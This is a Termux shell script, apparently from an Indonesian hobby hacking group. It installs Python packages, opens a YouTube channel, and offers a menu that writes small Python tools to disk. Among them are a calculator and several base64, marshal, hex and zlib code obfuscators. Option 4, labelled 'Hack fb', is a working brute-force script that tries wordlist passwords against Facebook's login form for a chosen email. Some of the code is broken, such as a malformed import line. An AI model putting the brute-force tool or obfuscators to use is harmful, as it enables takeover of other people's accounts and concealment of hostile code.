#!/bin/shell

logo(){
clear
sleep 3
echo -e '\033[32m
 █████  ██    ██ ████████  ██████       ██████  ██████  ██████  ██ ███    ██  ██████
██   ██ ██    ██    ██    ██    ██     ██      ██    ██ ██   ██ ██ ████   ██ ██
███████ ██    ██    ██    ██    ██     ██      ██    ██ ██   ██ ██ ██ ██  ██ ██   ███
██   ██ ██    ██    ██    ██    ██     ██      ██    ██ ██   ██ ██ ██  ██ ██ ██    ██
██   ██  ██████     ██     ██████       ██████  ██████  ██████  ██ ██   ████  ██████\n'
echo -e '
\033[37m<\033[31m/\033[37m>----------------------------------------<\033[31m/\033[37m>
\033[37m[\033[31m•\033[37m]\033[32m Author\033[31m :\033[32m MR.FAGHP BLACK-404/F          \033[37m[\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m Team\033[31m   :\033[32m BLACK SQUAD                   \033[37m[\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m YT\033[31m     :\033[32m FAGHP                         \033[37m[\033[31m•\033[37m]
\033[37m<\033[31m/\033[37m>----------------------------------------<\033[31m/\033[37m>
\033[37m[\033[31m•\033[37m]\033[32m                MENU\033[37m                    [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 1\033[31m.\033[32m Kalkulator\033[37m [\033[32mpython2\033[37m]                [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 2\033[31m.\033[32m encrypt base64\033[37m [\033[32mpython2\033[37m]            [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 3\033[31m.\033[32m encrypt marshal\033[37m [\033[32mpython3\033[37m]           [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 4\033[31m.\033[32m BRUTE FORCE pt1\033[37m (\033[32mHack fb\033[37m)\033[37m[\033[32mpython2\033[37m]  [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 5\033[31m.\033[32m Encrypt Hex\033[37m [\033[32mpython2\033[37m]               [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 6\033[31m.\033[32m Encrypt marshal zlib base\033[37m [\033[32mpython2\033[37m] [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 7\033[31m.\033[32m Decrypt base64\033[37m [\033[32mpython2\033[37m]            [\033[31m•\033[37m]
\033[37m[\033[31m•\033[37m]\033[32m 8\033[31m.\033[32m decrypt shell\033[37m [\033[32mpython2\033[37m]             [\033[31m•\033[37m]
\033[37m<\033[31m/\033[37m>----------------------------------------<\033[31m/\033[37m>\n'
echo -n -e '\033[32mPilih\033[31m :\033[32m '; read pil
if [ $pil = 1 ];
then
     cd hasil
     cat <<FAGHP>>kalkulator.py
#!/bin/python2

import os

os.system('clear')

print('(+)===============================(+)')
print('(1). penambahan')
print('(2). perngurangan')
print('(3). perkalian')
print('(4). pembagian')
print('(+)===============================(+)')
pilih = input('pilihan : ')
if pilih == 1:
  print
  angka_1 = input('angka ke1 : ')
  angka_2 = input('angka ke2 : ')
  total = angka_1 + angka_2
  print 'hasil',total

elif pilih == 2:
  print
  angka_1 = input('angka ke1 : ')
  angka_2 = input('angka ke2 : ')
  total = angka_1 - angka_2
  print 'hasil',total

elif pilih == 3:
  print
  angka_1 = input('angka ke1 : ')
  angka_2 = input('angka ke2 : ')
  total = angka_1 * angka_2
  print 'hasil',total

elif pilih == 4:
  print
  angka_1 = input('angka ke1 : ')
  angka_2 = input('angka ke2 : ')
  total = angka_1 / angka_2
  print 'hasil',total
FAGHP
exit
fi
if [ $pil = 2 ]
then
     cd hasil
     cat <<FAGHP>>enc-base64.py
import os,base64,,sys,time
from time import sleep


file = raw_input('\033[34m> \033[90m')
baca = open(file, 'r').read()
encrypt = base64.b64encode(baca)
baru = open('compile_'+str(file), 'w')
baru.write('import base64\n')
baru.write('exec(base64.b64decode("'+str(encrypt)+'"))')
print ('\n\033[32msuccessful encryption | saved as compile_'+str(file))
FAGHP
exit
fi
if [ $pil = 3 ]
then
     cd hasil
     cat <<FAGHP>>enc-marshal.py
import os
import marshal

os.system("clear")
file = input("> ")
baca = open(file, "r").read()
com = compile(baca, "", "exec")
encrypt = marshal.dumps(com)
baru = open("compile-"+str(file), "w")
baru.write("import marshal\n")
baru.write("exec(marshal.loads("+repr(encrypt)+"))")
print("Encrypt successfully saved as compile-"+str(file))
FAGHP
exit
fi
if [ $pil = 4 ]
then
     cd hasil
     cat <<FAGHP>>BRUTE.py
import os, sys, time, requests

#warna
merah='\033[31;1m'
putih='\033[37;1m'
os.system('clear')
email=raw_input('\033[31;1mEmail==>')
time.sleep(0.1)

url='https://free.facebook.com/login.php'
ex= open('Testing.txt', 'r').readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
    content = http.content
    if "Beranda" in content:
       print "[ + ] Password Found ",password
       sys.exit(1)
    else:
       print "[ ! ]  Password Invalid ",password
FAGHP
exit
fi
if [ $pil = 5 ]
then
     cd hasil
     cat <<FAGHP>>enc-hex.py
# module

import subprocess as sp
import sys
import tqdm
import os
import time
from time import sleep
from tqdm import tqdm
from sys import stdout
from os import system, rename

f = raw_input('File : ')
bk = open(f, 'r').read()
en = bk.encode('hex')
ff = f + 'c'
open(ff, 'w').write('exec("' + en + '").decode("hex")')
nm = ('').join(f.split('.')[:1]) + '-enc.py'
os.rename(ff, nm)
print('\033[32m Sukses Encrypt \033[90m| \033[32msave sebagai %s ' % nm)
FAGHP
exit
fi
if [ $pil = 6 ]
then
     cd hasil
     cat <<FAGHP>>enc-marshal-zlib_base64.py
# module
import os,sys,time,subprocess,marshal,zlib,base64
from os import system
from time import sleep
import subprocess as sp

file = raw_input('\033[37m{\033[31m?\033[37m}File \033[31m:\033[32m ')
fa = open(file).read()
no = compile(fa,'aso','exec')
b = marshal.dumps(no)
c = zlib.compress(b)
d = base64.b64encode(c)
e = ('import marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b64decode("' + d + '"))))')
f = file.replace('.py', '_enc.py')
g = open(f, 'w')
g.write(e)
g.close()
print('\n\033[37m{\033[32m+\033[37m} \033[32mSukses encrypt | save sebagai %s ' % f)
FAGHP
exit
fi
if [ $pil = 7 ]
then
     cd hasil
     cat <<FAGHP>>dec_base64.py
import base64
import os
code = "#Masukun code encrypt base64 nya ya"
data = base64.b64decode(code)
os.system('python2 dec-base64.py > hasil_dec.py')
FAGHP
exit
fi
if [ $pil = 8 ]
then
     cd hasil
     cat <<FAGHP>>Dec_Shell.py
# module
from os import system, remove
import time, sys
from time import sleep
 # Install
sleep(1)
system('clear')
system('apt-get install nodejs -y')
system('npm install -g bash-obfuscate')
system('git pull')
system('clear')
file = input('\033[35m{\033[33m?\033[35m} \033[32mFile \033[31m:  \033[32m')
openfile = open(file, 'r')
readfile = openfile.read()
openfile.close()
newcode = readfile.replace('eval', 'echo')
outfile = input('\033[35m{\033[33m?\033[35m} \033[32moutput \033[31m :  \033[32m')
newfile = open(outfile, 'w')
newfile.write(newcode)
newfile.close()
system('touch tools.sh')
system('bash ' + outfile + '> tools.sh')
remove(outfile)
system('mv -f tools.sh ' + outfile)
print('\033[32m{✓}sukses descrypt | di save sebagai ' + outfile)
FAGHP
exit
fi
}
clear
sleep 1
for i in $(seq 1 100)
do
    sleep 0.1
    echo $i
done | whiptail --title 'Tunggu...' --gauge 'loading...' 6 60 0
sleep 1
clear
sleep 1
echo -e '
██ ███    ██ ███████ ████████  █████  ██      ██
██ ████   ██ ██         ██    ██   ██ ██      ██
██ ██ ██  ██ ███████    ██    ███████ ██      ██
██ ██  ██ ██      ██    ██    ██   ██ ██      ██
██ ██   ████ ███████    ██    ██   ██ ███████ ███████\n' | lolcat
termux-setup-storage
pkg update && pkg upgrade
pkg install python3
pkg install python2
pip3 install requests
pip3 install mechanize
pip3 install pyprog
pip3 install tqdm
pip2 install requests
pip2 install mechanize
pip2 install pyprog
pip2 install tqdm
mkdir hasil
clear
sleep 1
echo -e 'JANGAN LUPA \033[36mSUBSCRIBE\033[37m ADMIN WE...\n'
sleep 2
xdg-open 'https://youtube.com/channel/UCFggfLWFCmGGyb2VH2EBfBQ'
sleep 2
clear
for i in $(seq 1 100)
do
    sleep 0.1
    echo $i
done | whiptail --title 'Tunggu...' --gauge 'loading...' 6 60 0
sleep 1
clear
logo
